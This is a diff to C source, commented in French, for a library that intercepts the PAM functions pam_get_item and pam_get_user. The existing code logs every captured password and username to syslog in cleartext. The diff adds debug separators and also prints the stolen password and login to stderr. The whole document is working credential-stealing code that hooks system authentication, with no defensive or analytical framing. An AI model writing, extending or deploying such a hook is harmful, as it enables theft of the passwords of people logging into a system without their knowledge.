@@ -19,6 +19,13 @@ const char *get_current_time() {
 typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
 typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);
 
+// Affichage d'un séparateur pour identifier le début et la fin
+void print_separator(const char *message) {
+    fprintf(stderr, "-------------------------------------------------------------------------------\n");
+    fprintf(stderr, "%s\n", message);
+    fprintf(stderr, "-------------------------------------------------------------------------------\n");
+}
+
 // Intercepteur pour pam_get_item
 int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
     static pam_get_item_t original_pam_get_item = NULL;
@@ -32,13 +39,18 @@ int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
         }
     }
 
+    print_separator("Entrée dans pam_get_item");
+
     // Appeler la fonction originale
     int retval = original_pam_get_item(pamh, item_type, item);
 
     // Si on capture un mot de passe (PAM_AUTHTOK)
     if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
         syslog(LOG_INFO, "[%s] Mot de passe capturé : %s", get_current_time(), (const char *)*item);
+        fprintf(stderr, "[DEBUG] Mot de passe capturé : %s\n", (const char *)*item);
     }
+
+    print_separator("Sortie de pam_get_item");
 
     return retval;
 }
@@ -56,13 +68,18 @@ int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
         }
     }
 
+    print_separator("Entrée dans pam_get_user");
+
     // Appeler la fonction originale
     int retval = original_pam_get_user(pamh, user, prompt);
 
     // Si le login est récupéré avec succès
     if (retval == PAM_SUCCESS && user && *user) {
         syslog(LOG_INFO, "[%s] Login capturé : %s", get_current_time(), *user);
+        fprintf(stderr, "[DEBUG] Login capturé : %s\n", *user);
     }
+
+    print_separator("Sortie de pam_get_user");
 
     return retval;
 }
